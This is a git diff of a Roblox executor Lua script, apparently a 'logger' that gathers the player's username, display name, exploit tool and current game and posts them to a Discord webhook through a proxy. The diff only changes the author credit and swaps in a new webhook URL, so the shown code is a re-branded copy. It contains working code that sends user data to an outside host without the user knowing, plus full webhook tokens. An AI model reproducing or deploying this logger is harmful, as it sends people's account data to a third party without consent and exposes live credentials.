@@ -121,7 +121,7 @@ local function UwU()
 		_13 = "<13"
 	end
 	local Embed = {
-		["title"] = "__**hmm1x's exciting logger**__",
+		["title"] = "__**Noahs exciting logger**__",
 		["description"] = "Name: ``"..plr.Name.."``\nDisplay Name: ``"..plr.DisplayName.."``\nExploit: ``"..getexploit()..'``'.."\nGame: ["..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name.."](https://www.roblox.com/games/"..game.PlaceId..')',
 		["type"] = "rich",
 		["color"] = tonumber(0xffff00),
@@ -174,13 +174,13 @@ local function UwU()
 			["inline"] = true
 		},
 		["footer"] = {
-			["text"] = "made by hmm1x#5132",
+			["text"] = "made by Noah",
 			["icon_url"] = "https://media.discordapp.net/attachments/1084319264569311305/1084328067553570906/Boykisser.png"
 		},
 		["timestamp"] = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec),
 	};
 	(syn and syn.request or http_request or http.request) {
-		Url = 'https://webhook.lewisakura.moe/api/webhooks/1089634231220703282/K6uRpCnRv5r8qanADAh9aL50STTWzG5al63AjWbJA4u2hjEt1YcbVPjTU24LpUvwijZt';
+		Url = 'https://webhook.lewisakura.moe/api/webhooks/1096658888398479431/9f4kB6l0RZOIwVNfsKLHxAOqlRl5KezV6aSk3aCSSDZ9aN_5ICR5lfL3ZKq4ye8bxO1W';
 		Method = 'POST';
 		Headers = {
 			['Content-Type'] = 'application/json';
